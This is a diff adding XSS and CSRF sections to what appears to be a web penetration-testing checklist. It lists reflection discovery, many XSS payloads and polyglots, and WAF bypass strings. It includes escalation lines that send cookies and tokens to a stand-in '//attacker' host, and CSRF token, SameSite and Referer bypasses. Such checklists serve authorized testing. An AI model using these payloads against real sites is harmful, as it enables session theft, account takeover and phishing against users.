@@ -494,5 +494,309 @@
 
 </details>
 
+<details>
+
+<summary>XSS</summary>
+
+### XSS / HTML Injection — Test-Case Checklist
+
+> Run these boxes against a reflection/sink. Order: find reflection → context → HTML injection → tag/handler/JS → blind → DOM → filter/WAF bypass → escalation → impact. Tag every probe with a unique marker (e.g. `88xyz`) so you can grep which input landed and where.
+
+***
+
+### 0. Find Reflection / Sink Points
+
+* [ ] `echo "domain.com" | gau | kxss | grep ">"` (reflected params)
+* [ ] gau/waymore → collect URLs → test reflection
+* [ ] Dork endpoints: `ext:php|asp|aspx|jsp|pl|cfm|py|rb|html`
+* [ ] Walk every feature in Burp/ZAP, test each param for reflection (Reflector ext)
+* [ ] Param discovery: Param-Miner, Arjun → test reflection of discovered params
+* [ ] Check reflection in: query params, POST body, JSON fields, headers, cookies, path
+* [ ] Note **how many times** and **where** the marker reflects (multiple sinks differ)
+
+***
+
+### 1. Identify the Reflection Context
+
+* [ ] HTML body (between tags) → tag injection
+* [ ] HTML tag attribute (quoted `"`/`'` or unquoted) → break out / event handler
+* [ ] Inside `<script>` block → break JS string / statement
+* [ ] Inside HTML comment `<!-- -->`
+* [ ] Inside `<title>`/`<textarea>`/`<noscript>`/`<style>` (RAWTEXT/RCDATA) → needs closing tag
+* [ ] URL/href/src attribute → `javascript:` scheme
+* [ ] JSON response (and what chars are forbidden, e.g. `{}`)
+* [ ] `<input type=hidden>` / `<link>` attribute → `accesskey` trick
+* [ ] Markdown / rich-text editor
+* [ ] Determine encoding applied (HTML-entity? URL? none?) — dictates payload
+
+***
+
+### 2. HTML Injection (no JS yet)
+
+* [ ] `88<h1>POC</h1>88` (basic tag injection)
+* [ ] `<iframe src=https://google.com></iframe>`
+* [ ] Double/entity-encoded variants (`%253Ch1%253E`, `&#60;h1&#62;`) to test decode layers
+* [ ] Inject a `<form>` (credential-harvest overlay)
+* [ ] Open redirect: `<meta http-equiv="refresh" content="0;url=//attacker">`
+* [ ] Open redirect: `<a href=//attacker><font size=100>click</font></a>`
+* [ ] Set-Cookie: `<meta http-equiv="Set-Cookie" Content="SESSID=1">`
+* [ ] Dangling-markup secret theft: `<img src='//attacker/?` (unclosed)
+* [ ] CSS exfil: `<style>@import//attacker?` / `<table background='//collab?'`
+* [ ] Form hijack: inject `<form action=//attacker>` before a real form
+* [ ] `<noscript>` form overlay
+* [ ] Portal tag: `<portal src='//attacker?`
+* [ ] PasteJacking (hidden span with payload)
+* [ ] HTML→SSRF: `<iframe src=//site/redirect.php?link=file:///etc/passwd>`
+
+***
+
+### 3. Inject an Event Handler
+
+* [ ] WAF probe: inject `<x` → does it reach an event-handler position?
+* [ ] `onxxx=yyy` — find how many `x` it accepts, adjust tag accordingly
+* [ ] Agnostic handlers (tag-independent): `onblur`, `onclick`, `onmouseover`, `oncopy`, `oncut`, `onpaste`, `oninput`, `onkeydown`, `oncontextmenu`, `ondblclick`, `ondrag`
+* [ ] `contenteditable` + `onblur`/`onfocus`/`oninput`/`onkeydown` (no interaction tricks)
+* [ ] Auto-trigger: `onfocus + autofocus`, `style=font-size:500px onmouseover`
+* [ ] Brute-force the full handler list (PortSwigger cheat-sheet) when filtered
+
+***
+
+### 4. XSS Without Event Handlers
+
+* [ ] `href`: `<a href=javascript:alert(1)>click`
+* [ ] `action`: `<form action=javascript:alert(1)><input type=submit>`
+* [ ] `formaction`: `<form><button formaction=javascript:alert(1)>click`
+* [ ] `data`: `<object data=javascript:alert(1)>`
+* [ ] `srcdoc`: `<iframe srcdoc=...>`
+* [ ] `xlink:href`: `<svg><script xlink:href=data:,alert(1)></script>`
+* [ ] SVG `<animate>` from `javascript:` URL
+* [ ] `<math><brute href=javascript:alert(1)>`
+
+***
+
+### 5. Inject JS / Confirm Execution
+
+* [ ] `'"--><svg onload=alert(1)>` (break-out polyglot)
+* [ ] `"'-->aaaaa<h1 onclick=alert(1)>` (context escape)
+* [ ] `<img src=x onerror=alert(1)>`
+* [ ] `<script>alert(document.domain)</script>`
+* [ ] `<svg/onload=prompt(document.cookie)>`
+* [ ] `<input/onauxclick="[1].map(prompt)">`
+* [ ] `<body onbeforescriptexecute="[1].map(confirm)">`
+* [ ] base64 eval: `<img src=x onerror=eval(atob('...'))>`
+* [ ] popover: `<button popovertarget=x>..<input popover id=x onbeforetoggle=alert(document.cookie)>`
+* [ ] Confirm with `document.domain` (proves origin) not just `alert(1)`
+
+***
+
+### 6. Polyglots (context-agnostic one-shots)
+
+* [ ] `jaVasCript:/*-/*`/_\`/_'/_"/\*\*/(/_ \*/oNcliCk=alert() )//%0D%0A...\<sVg/oNloAd=alert()//>\`
+* [ ] `'">><marquee><img src=x onerror=confirm(1)></marquee>...<script>prompt(1)</script>`
+* [ ] `';alert(String.fromCharCode(88,83,83))//...</SCRIPT>">'><SCRIPT>...`
+* [ ] Jhaddix / RSnake / Mario master polyglot strings
+
+***
+
+### 7. Blind XSS (stored, fires elsewhere)
+
+* [ ] Plant in: name fields, support tickets, user-agent, referer, contact forms, image uploads
+* [ ] `"><script src=//xss.report/s/XXXX></script>`
+* [ ] `<img src=x id=<base64> onerror=eval(atob(this.id))>` (CSP/lenient sinks)
+* [ ] XSS Hunter / xss.report / js.rip listener
+* [ ] Burp Collaborator client for blind callbacks
+
+***
+
+### 8. DOM XSS
+
+* [ ] Identify sources→sinks: `location`, `document.URL`, `referrer`, `postMessage`, cookie → `innerHTML`, `document.write`, `eval`, `setTimeout`, `src`
+* [ ] Hash/query-driven sinks: `#payload`, `?param=`
+* [ ] `postMessage` listener with no origin check → frame it and post payload
+* [ ] `JSON.parse`-based message handling
+* [ ] DOM cookie manipulation
+* [ ] DOM clobbering to enable XSS / bypass HTML filters
+* [ ] Swagger-UI: `?configUrl=`/`?url=` pointing to attacker JSON/YAML
+* [ ] AngularJS template injection: `{{constructor.constructor('alert(1)')()}}`
+
+***
+
+### 9. Filter / WAF Bypass
+
+* [ ] Case toggle: `<sCRipT>`, `<Svg/OnLoad>`
+* [ ] Null byte / junk: `<scr\x00ipt>`, recursive `<scr<script>ipt>`
+* [ ] Whitespace alts: `<svg·onload>`, `&Tab;`, `%0a`, `/**/`
+* [ ] Encoding layers: URL, double-URL, unicode `\u0061`, hex `\x61`, HTML entities, `String.fromCharCode`
+* [ ] Code-eval keyword bypass: `eval('ale'+'rt(1)')`, `Function('alert(1)')()`, `setTimeout('...')`, `Set.constructor`...
+* [ ] `.JSON`/`.html` bypass: `...redacted.json//%3Csvg onload=...%3E.html`
+* [ ] `<meta>` tag injection / ASP.NET ResolveUrl `~/(A(...))/` trick
+* [ ] SVG-context WAF bypass (`xlink:href` entity-encoded)
+* [ ] Markdown XSS: `[a](javascript:prompt(document.cookie))`, base64 `data:` link
+* [ ] Email-field XSS: `"<svg/onload=alert(1)>"@x.y`, `["');alert(1)//"]@x.x`
+* [ ] Per-WAF strings (Cloudflare/Akamai/Incapsula/Imperva/Sucuri/ModSecurity/F5/PHP-IDS/WebKnight)
+
+***
+
+### 10. File-Based & Header-Based
+
+* [ ] Upload `.svg` with embedded `<script>alert()</script>`
+* [ ] Polymorphic image (valid image + JS) for `<script src=img>` contexts
+* [ ] File-upload **filename** as payload (intercept, rename to `<img onerror>`)
+* [ ] RFI→XSS: `php?=//attacker/poc.svg`
+* [ ] Host/header injection: `Host: bing.com"><script>alert(document.domain)</script>`
+* [ ] Reflected XSS via HTTP request smuggling (front-end/back-end desync)
+
+***
+
+### 11. Escalation / Impact
+
+* [ ] Cookie theft: `<script>new Image().src='//attacker/?'+document.cookie</script>` (needs non-HttpOnly)
+* [ ] Token theft: `...+localStorage.getItem('access_token')`
+* [ ] XSS→ATO via fetch to `/account` + exfil to Collaborator
+* [ ] Self-XSS → reflected: save response as `.html`, confirm it executes
+* [ ] Self-XSS + CORS misconfig → ATO (fetch authed API, exfil response)
+* [ ] XSS→CSRF: fetch CSRF token from page, submit state-changing request
+* [ ] XSS→SSRF: `<esi:include src=//internal>` / iframe to internal
+* [ ] XSS→LFI: `XMLHttpRequest` GET `file:///etc/passwd` → `document.write`
+* [ ] XSS→RCE (admin panels / desktop-app webviews)
+* [ ] Phishing: inject `<iframe src=//attacker>` / fake login form
+* [ ] Defacement / forced open-redirect
+* [ ] Re-verify on clean session; record param, context, sink, and stored-vs-reflected
+
+***
+
+### Tooling
+
+* [ ] kxss + gau/waymore (reflection discovery)
+* [ ] Param-Miner, Arjun (hidden params)
+* [ ] Burp Reflector / Reflect, Burp Collaborator
+* [ ] XSS Hunter / xss.report / js.rip (blind)
+* [ ] DalFox / XSStrike (automated fuzz) ; PortSwigger & Brute Logic cheat-sheets
+
+</details>
+
+<details>
+
+<summary>CSRF</summary>
+
+> Run these boxes against a state-changing request. Order: confirm it's a CSRF candidate → probe each defense → bypass tokens/headers/SameSite → JSON/content-type tricks → chain → impact. Test with a valid session in one browser and the forged request from another origin.
+
+***
+
+### 0. Is This a CSRF Candidate?
+
+* [ ] Request changes state (settings, password, email, payment, role, delete, logout)
+* [ ] Request relies only on cookies for auth (no custom header / no token enforced)
+* [ ] Response isn't needed by attacker (blind state change is enough)
+* [ ] Cookies sent cross-site? Check `SameSite` attribute (None/Lax/Strict)
+* [ ] Identify the protection in use: token / SameSite / JSON CT / re-auth / double-submit / Origin-Referer / captcha / custom header
+
+***
+
+### 1. Where to Look
+
+* [ ] Auth-required actions (settings, password, email)
+* [ ] Profile changes (email, personal info, picture)
+* [ ] Account deletion / suspension
+* [ ] Payment / transactional (add card, transfer, subscription)
+* [ ] Form submissions (support tickets, feedback, content)
+* [ ] Security settings (enable/disable 2FA, security questions)
+* [ ] Privilege escalation (role/permission change)
+* [ ] Logout (forced logout CSRF)
+* [ ] Password reset flow
+* [ ] Third-party / social-account linking (OAuth connect)
+* [ ] Like / comment / add-to-cart / balance transfer
+
+***
+
+### 2. No-Token / Missing Validation
+
+* [ ] Remove the CSRF token parameter entirely → still accepted?
+* [ ] Send empty token (`csrf_token=`) → still accepted?
+* [ ] Delete token AND build auto-submitting `<form>` PoC
+* [ ] Brand-new session/account: is token even required on first use?
+
+***
+
+### 3. Token Integrity / Reuse
+
+* [ ] Reuse your own old/static token on a new request
+* [ ] If token is fixed per account → make PoC with attacker's old token, change email to victim
+* [ ] Replace token with a fake value of the **same length**
+* [ ] Use another user's token (is it tied to the session?)
+* [ ] Token analysis (Burp): is part static, part dynamic? Send only the static part
+* [ ] Try to decrypt/crack the token if it looks like a hash
+* [ ] Token in cookie only (not validated against body) → swap it
+
+***
+
+### 4. Double-Submit Cookie Bypass
+
+* [ ] Valid baseline: cookie token == body token
+* [ ] Set BOTH cookie and body to the same **arbitrary** value (`not_a_real_token`) → accepted?
+* [ ] Inject the CSRF cookie via another vuln (header injection / subdomain) then match it in body
+
+***
+
+### 5. Method & Content-Type Tricks
+
+* [ ] Change POST → GET (`/password_change?new_password=abc`)
+* [ ] Method override: `_method=POST` / `X-HTTP-Method-Override`
+* [ ] JSON CT → `application/x-www-form-urlencoded` (`phone=...`)
+* [ ] JSON CT → `text/plain` (`phone=...`)
+* [ ] JSON CT → keep `application/json` but send via form with `enctype="text/plain"` padding trick (`name='{"phone":"...","a":"' value='"}'`)
+* [ ] Drop Content-Type entirely
+
+***
+
+### 6. Origin / Referer Header Bypass
+
+* [ ] Remove Referer with `<meta name="referrer" content="no-referrer">`
+* [ ] Referer suffix trick: `Referer: example.com.attacker.com` (substring check)
+* [ ] Referer prefix trick: `Referer: attacker.com/example.com`
+* [ ] Send no Origin header (cross-origin GET / downgrade)
+* [ ] Check if validation only fires _when header present_ → omit it
+
+***
+
+### 7. SameSite Bypass
+
+* [ ] `SameSite=Lax` → use a top-level GET navigation (it's allowed)
+* [ ] Method downgrade (POST→GET) to ride Lax allowance
+* [ ] Sister/sub-domain request (same-site, different origin) to satisfy Lax/Strict
+* [ ] Cookie refresh window: trigger a flow that re-issues cookie without SameSite
+* [ ] No SameSite set + old browser → treated as None
+
+***
+
+### 8. Chaining
+
+* [ ] Steal CSRF token via XSS, then submit forged request
+* [ ] Subdomain takeover + CORS → read token cross-origin
+* [ ] CORS misconfig → fetch token from authed endpoint
+* [ ] Domain-confusion (parser differences) → ATO
+* [ ] OAuth `state` parameter: null byte `%00`, remove, or reuse → linking CSRF → ATO
+* [ ] Clickjacking when no token (frame the action page)
+* [ ] GraphQL endpoint without CSRF protection (site-wide)
+
+***
+
+### 9. User-Agent / Client Bypass
+
+* [ ] Switch to mobile/tablet User-Agent → token check skipped?
+* [ ] Native-app / API client path may not enforce token
+
+***
+
+### 10. Build & Verify PoC
+
+* [ ] Auto-submitting `<form>` for `x-www-form-urlencoded`
+* [ ] `enctype="text/plain"` form for JSON endpoints
+* [ ] `history.pushState` to spoof a clean/expected path
+* [ ] Clickjacking iframe page (when applicable)
+* [ ] Fire from a different origin, logged in as victim in another tab
+* [ ] Confirm the state actually changed on the victim account
 
 
+
+</details>
